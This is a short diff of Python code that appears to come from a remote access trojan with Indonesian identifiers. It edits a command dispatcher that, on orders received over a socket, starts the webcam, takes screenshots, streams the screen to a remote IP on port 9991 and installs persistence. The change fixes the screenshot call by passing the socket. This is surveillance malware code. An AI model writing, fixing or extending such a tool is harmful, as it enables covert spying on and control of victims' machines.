@@ -239,7 +239,7 @@ def jalankan_perintah(sok):
         elif perintah == 'start_cam':
             byte_stream()
         elif perintah == 'screen_shot':
-            screen_shot()
+            screen_shot(sok)
         elif perintah == 'screen_share':
             send_screen_record(ip=ip, port=9991)
         elif perintah[:11] == 'persistence':
